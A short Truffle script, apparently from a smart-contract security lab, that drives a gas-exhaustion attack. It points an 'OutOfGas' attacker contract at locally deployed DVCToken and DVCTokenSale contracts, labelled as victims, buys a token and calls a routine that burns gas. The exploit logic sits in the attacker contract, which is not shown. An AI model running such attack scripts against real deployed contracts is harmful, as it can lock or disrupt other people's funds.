var contractDVCToken = artifacts.require('DVCToken');
var contractDVCTokenSale = artifacts.require('DVCTokenSale');
var contractOutOfGas = artifacts.require('OutOfGas');

async function execute(callback) { 

    var victim = await contractDVCToken.deployed();
    var victimSale = await contractDVCTokenSale.deployed();
    var attacker = await contractOutOfGas.deployed();

    //Set addresses in my attacker contract
    await attacker.setVictimsAddresses(victim.address, victimSale.address);

    //Victim gives 5 tokens to VictimSale contract
    await victim.transfer(victimSale.address, 5, {from: web3.eth.accounts[8]});

    //Attacker buys 1 token
    console.log(`Attacker contract buying tokens...\n`);
    await attacker.buy();

    console.log(`Burning gas...\n`);
    await attacker.runOutOfGas();

    callback();
} 

module.exports = execute